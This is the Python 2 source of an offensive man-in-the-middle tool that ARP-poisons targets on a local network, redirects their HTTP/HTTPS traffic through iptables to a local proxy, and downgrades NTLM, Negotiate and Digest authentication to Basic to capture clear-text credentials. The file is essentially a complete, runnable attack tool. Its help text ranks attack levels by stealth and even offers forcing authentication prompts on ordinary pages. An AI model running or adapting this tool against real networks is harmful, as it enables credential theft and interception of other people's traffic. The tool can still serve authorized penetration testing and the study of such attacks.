import time
import argparse
import os
import sys
import threading
import config
import socket
import proxy

try:
	import netinfo
except ImportError:
	print "[!] Error: python-netinfo not found"
	sys.exit(1)
try:
	import netaddr
except ImportError:
	print "[!] Error: python-netaddr not found"
	sys.exit(1)
try:
	import logging
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
	from scapy.all import Ether, ARP, IP, ICMP, sr1, conf as scapy_conf, sendp as scapy_send
except ImportError:
	print "[!] Error: python-scapy not found"
	sys.exit(1)

def main():

	parser = argparse.ArgumentParser(description="""
	HTTP Authentication downgrade tool
	----------------------------------

	This tool is a man-in-the-middle utility intended to downgrade authentication requests it receives 
	to Basic in order to capture clear-text credentials.  This is done by:

		- ARP cache poisoning the target(s) to redirect their traffic to the attacker ;
		- Starting a local HTTP proxy instance ;
		- Redirecting the targets' connections to the specified ports to the local proxy ;
		- Relaying HTTP/S traffic to and from clients ;
		- Intercepting NTLM, Negotiate and Digest auth. requests from the remote web servers or proxy ;
		- Rewriting the responses to request Basic authentication.

	HTTPS will be intercepted if port 443 is specified, however clients may see certificate warnings.
	
	Levels of attakcs from stealthiest to noisiest (different levels can be used simultaneously):

	1. Downgrade authentication requests in 407 responses (most likely domain accounts)
	2. Downgrade authentication requests in 401 responses (for web apps / intranets / ...)
	3. Rewrite 200 responses to 401 to force authentication (very intrusive)

	By default the tool will stop all attacks towards any given client after clear-text credentials have
	been captured from this client.  To continue attacking no matter what, this can be disabled with the 
	--nonstop option (very intrusive++).

	Example usage: %s --iface eth0 --levels 1,2 192.168.1.0/24

	""" % sys.argv[0], formatter_class=argparse.RawTextHelpFormatter)

	parser.add_argument('target',    metavar='<target>',  action='store', help="Comma-sparated list of target IP addresses or CIDR networks")
	parser.add_argument('--router',  default=None,     metavar='<router>',  action='store', help="Local network gateway (default: autodetect)")
	parser.add_argument('--iface',   default='eth0',   metavar='<iface>',   action='store', help="Network interface card to use (default: eth0)")
	parser.add_argument('--nofw',    default=False,    action='store_true', help="Do not auto-configure routing and iptables rules (default: false)")
	parser.add_argument('--freq',    default=5.0,      metavar='<freq>',    action='store', type=float, help="ARP poison packets frequency in seconds (default: 5)")
	parser.add_argument('--ports',   default='80',     metavar='<ports>',   action='store', help="Comma seperated list of ports to intercept (default: 80)")
	parser.add_argument('--proxy',   default=None,     metavar='<proxy>',   action='store', help="External proxy to forward clients' traffic to (format: ip:port)\n\n")
	parser.add_argument('--nonstop', default=False,    action='store_true', help="Continue attacking clients after capturing credentials (default: false) ")
	parser.add_argument('--levels',  default='1',      metavar='<levels>',  action='store', help="Comma separated list of attack levels. See above for description (default: 1)\n\n")
	parser.add_argument('--verbose', default=False,    action='store_true', help="Enable verbose output")
	
	config.init()
	config.cfg.args = parser.parse_args()
	 
	try:
		config.cfg.args.local_ip = netinfo.get_ip(config.cfg.args.iface)
	except:
		print "[!] Error: Interface %s not found" % config.cfg.args.iface
		sys.exit(0)

	for route in netinfo.get_routes():
		if route['dest'] == '0.0.0.0':
			config.cfg.args.router = route['gateway']

	if config.cfg.args.router == None:
		print "Error: could not detect default gateway"
		sys.exit(0)


	try:
		config.cfg.args.levels = [int(x) for x in config.cfg.args.levels.split(',')]
	except:
		print "[!] Invalid level specified."
		sys.exit()

	# Using upstream proxy
	if config.cfg.args.proxy is not None:

		config.cfg.args.proxy = config.cfg.args.proxy.rstrip('/').replace('http://', '').replace('https://', '')
		config.cfg.args.proxy = config.cfg.args.proxy.split(':')

		try:    config.cfg.args.proxy = (config.cfg.args.proxy[0], int(config.cfg.args.proxy[1]))
		except: config.cfg.args.proxy = (config.cfg.args.proxy[0], 8080)

		# Test upstream proxy connection
		s = socket.socket()
		try:
			s.connect((config.cfg.args.proxy[0], config.cfg.args.proxy[1]))
			s.close()
		except Exception as e: 
			print "[!] Error: Unable to connect to proxy."
			s.close()
			sys.exit()

	config.cfg.args.ip_list = []
	for i in config.cfg.args.target.split(','):
		if '/' in i:
			net = netaddr.IPNetwork(i)
			config.cfg.args.ip_list = config.cfg.args.ip_list + [str(x) for x in net if x not in [net.network, net.broadcast]]
		else:
			config.cfg.args.ip_list.append(i)

	# Start proxy
	for port in config.cfg.args.ports.split(","):
		try:
			port = int(port)
		except:
			print "Wrong port"
			sys.exit()
	
		print "[*] Starting proxy on  %s:%d..." % (config.cfg.args.local_ip, port)
		#t = thread.start_new_thread(proxy_thread, (config.cfg.args.local_ip, port))
		t0 = threading.Thread(target=proxy.proxy_thread, args=(config.cfg.args.local_ip, port))
		t0.daemon = True
		t0.start()


	# Configure iptables
	if config.cfg.args.nofw == False:
		if os.getuid() != 0:
			print "[!] Error: Must run as root to auto-configure routing and iptables rules"
			sys.exit(0)
		else:
			conf_ip_forward()

	config.cfg.my = (netinfo.get_ip(config.cfg.args.iface), netinfo.get_hwaddr(config.cfg.args.iface))
	config.cfg.router = (config.cfg.args.router, '')
	config.cfg.clients = {}

	# Start ARP poison thread
	scapy_conf.iface = config.cfg.args.iface
	t1 = threading.Thread(target=arp_poison_loop)
	t1.daemon = True
	t1.start()

	try:
		while 1:
			time.sleep(1)
	except:
		t0.stopped = True
		t1.stopped = True
		clean_exit()

def arp_poison_send(hwsrc, psrc, pdst):
	if config.cfg.args.verbose:
		print "\n>>> to: %-15s > ARP %-15s who-has %s" % (psrc, pdst, hwsrc),

	packet = Ether()/ARP(op="who-has", hwsrc=hwsrc, psrc=psrc, pdst=pdst)
	scapy_send(packet, verbose=0)

def arp_poison_thread(addr):
	while True:
		# Poison target's IP in router's cache
		arp_poison_send(config.cfg.my[1], addr, config.cfg.router[0])

		# Poison router's IP in all targets caches
		arp_poison_send(config.cfg.my[1], config.cfg.router[0], addr)

		# Sleep until next round
		time.sleep(config.cfg.args.freq)

def arp_poison_loop():
	print "[*] Poisoning ARP caches..."
	for addr in config.cfg.args.ip_list:
		
		# exclude myself and router
		if addr in [config.cfg.my[0], config.cfg.router[0]]:
			continue

		t = threading.Thread(target=arp_poison_thread, args=(addr,))
		t.daemon = True
		t.start()

def conf_ip_forward():

	config.cfg.init_ipfwd = open("/proc/sys/net/ipv4/ip_forward").read().strip()
	config.cfg.init_redir = open("/proc/sys/net/ipv4/conf/" + config.cfg.args.iface + "/send_redirects").read().strip()

	# Enable IP forwarding and disable ICMP redirects
	print "[i] Enabling IP forward..."
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write('1')
	f.close()
	f = open("/proc/sys/net/ipv4/conf/" + config.cfg.args.iface + "/send_redirects", "w")
	f.write('0')
	f.close()

	print "[i] Configuring iptables rules..."
	os.system("/sbin/iptables --flush")
	os.system("/sbin/iptables -t nat --flush")
	os.system("/sbin/iptables --zero")
	os.system("/sbin/iptables -A FORWARD --in-interface " +  config.cfg.args.iface + " -j ACCEPT")
	os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + config.cfg.args.iface + " -j MASQUERADE")
	
	# Forward ports to our proxy
	for port in config.cfg.args.ports.split(","):
		os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport " + port + " --jump DNAT --to-destination " + config.cfg.args.local_ip)

def restore_initial_state():

	print "[i] Restoring IP forward initial state..."
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write(config.cfg.init_ipfwd)
	f.close()
	f = open("/proc/sys/net/ipv4/conf/" + config.cfg.args.iface + "/send_redirects", "w")
	f.write(config.cfg.init_redir)
	f.close()

	print "[i] Restoring iptables initial state..."
	os.system("/sbin/iptables --flush")
	os.system("/sbin/iptables -t nat --flush")
	os.system("/sbin/iptables --zero")

def clean_exit():
	print ""
	#arp_poison_restore()
	restore_initial_state()
	print "Exiting..."
	sys.exit(1)

if __name__ == '__main__':
	main()
